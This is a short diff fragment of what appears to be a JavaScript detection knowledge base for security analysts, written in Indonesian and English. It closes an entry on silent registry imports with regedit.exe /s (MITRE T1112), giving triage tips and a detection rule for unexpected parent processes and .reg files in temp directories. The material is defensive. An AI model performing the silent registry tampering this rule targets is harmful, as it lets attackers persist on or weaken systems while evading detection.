+    tips:["Cek /s flag — silent import dari mana?","Cek .reg file content","Alert spawned dari script/Office/browser","Interactive use = low suspicion","Cek registry changes post-exec"],
+    detect:"Alert regedit.exe /s dari non-admin atau unexpected parent process. Monitor .reg imports dari temp directories.",
+    ref:["https://attack.mitre.org/techniques/T1112/"] },
+
 ];
 
 export default DB;
